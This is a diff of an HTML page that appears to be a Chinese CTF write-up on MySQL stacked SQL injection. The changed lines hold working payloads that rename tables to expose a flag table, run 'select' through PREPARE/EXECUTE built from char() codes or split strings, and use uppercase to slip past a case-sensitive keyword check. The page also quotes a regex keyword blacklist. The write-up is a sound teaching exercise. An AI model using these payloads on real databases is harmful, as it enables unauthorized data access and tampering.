@@ -466,7 +466,7 @@
 <p>array(6) {<br><br>  [0]=&gt;<br><br>  string(4) “data”<br><br>  [1]=&gt;<br><br>  string(11) “varchar(20)”<br><br>  [2]=&gt;<br><br>  string(2) “NO”<br><br>  [3]=&gt;<br><br>  string(0) “”<br><br>  [4]=&gt;<br><br>  NULL<br><br>  [5]=&gt;<br><br>  string(0) “”</p>
 <p>可以惊喜的发现，它第一个数组里面有一个id，然后第二个是data，所以此刻我们有理由怀疑，1’ or 1=1#的出来的数据就是words这个表里面的，那么我们能不能把words这个表改名成别的，然后再把FlagHere这个表改为words，然后再将data字段名概率论</p>
 <p>尝试修改words的名字和字段data</p>
-<p>alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p>
+<p>alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#</p>
 <p>flag{a29fba37-6b85-4157-bd97-dd638d430d8b}</p>
 <p>有一点，堆叠注入我不知道有要求还是啥，不一次性把语句写完，不一定能拿到flag。</p>
 <h2>方法二 预处理，堆叠注入</h2>
@@ -492,12 +492,14 @@
 
 <p>本题目因为过滤了select。所以用ascii对select进行编码char(115, 101, 108, 101, 99, 116)</p>
 <p>使用无变量版：</p>
-<p>1’;prepare name from concat(char(115, 101, 108, 101, 99, 116),’ * from <code>1919810931114514</code>‘);execute name;#<br>(concat是连接字符的，具体可参考sql1~10)</p>
+<p>1’;prepare name from concat(char(115, 101, 108, 101, 99, 116),’ * from `1919810931114514`‘);execute name;#</p>
+<p>1’;prepare name from concat(‘selec’,’t’,’ * from `1919810931114514`‘);execute name;#<br>(concat是连接字符的，具体可参考sql1~10)</p>
 <p>使用变量</p>
-<p>1’;set @sqli=concat(char(115,101,108,101,99,116),’* from <code>1919810931114514</code>‘);prepare hacker from @sqli;execute hacker;#</p>
+<p>1’;set @sqli=concat(char(115,101,108,101,99,116),’* from `1919810931114514`‘);prepare hacker from @sqli;execute hacker;#</p>
 <p>报错了，说明有防御机制，这种方法不可行，strstr($inject, “set”) &amp;&amp; strstr($inject, “prepare”)</p>
 <p>但是，这个时不会略大小写的，我们可以把set prepare转成大写</p>
-<p>1’;SET @sqli=concat(char(115,101,108,101,99,116),’* from <code>1919810931114514</code>‘);PREPARE hacker from @sqli;EXECUTE hacker;#<br>OK</p>
+<p>1’;SET @sqli=concat(char(115,101,108,101,99,116),’* from `1919810931114514`‘);PREPARE hacker from @sqli;EXECUTE hacker;#</p>
+<p>OK</p>
 <h2>GYCTF2020 Blacklist</h2>
 
 <p>return preg_match(“/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i”,$inject);</p>
@@ -543,7 +545,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-03T21:16:45+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-03T21:26:08+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：Mar 3, 2021</p>
